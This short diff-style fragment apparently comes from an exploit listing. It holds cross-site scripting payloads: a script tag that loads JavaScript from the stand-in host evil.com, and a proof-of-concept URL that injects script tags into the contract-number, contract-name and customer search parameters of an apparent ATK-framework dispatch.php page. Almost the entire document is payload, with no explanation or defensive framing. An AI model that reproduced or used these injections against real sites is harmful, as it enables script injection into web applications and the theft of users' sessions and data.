@@ -1,0 +1,4 @@
+&lt;SCRIPT SRC=//evil.com/xss.js&gt;&lt;/SCRIPT&gt;
+
+
+http://www.example.com/dispatch.php?atkprevlevel=0&amp;atkescape=&amp;atknodetype=organization.contracts&amp;atkaction=admin&amp;atksmartsearch=clear&amp;atkstartat=0&amp;atksearch[contractnumber]=&quot;&gt;&lt;script&gt;alert(&#039;xss&#039;);&lt;/script&gt;&amp;atksearchmode[contractnumber]=substring&amp;atksearch[contractname]=&quot;&gt;&lt;script&gt;alert(&#039;xss&#039;);&lt;/script&gt;&amp;atksearchmode[contractname]=substring&amp;atksearch_AE_contracttype[contracttype][=&amp;atksearchmode[contracttype]=exact&amp;atksearch_AE_customer[customer]=&quot;&gt;&lt;script&gt;alert(&#039;xss&#039;);&lt;/script&gt;&amp;atksearchmode[customer]=substring
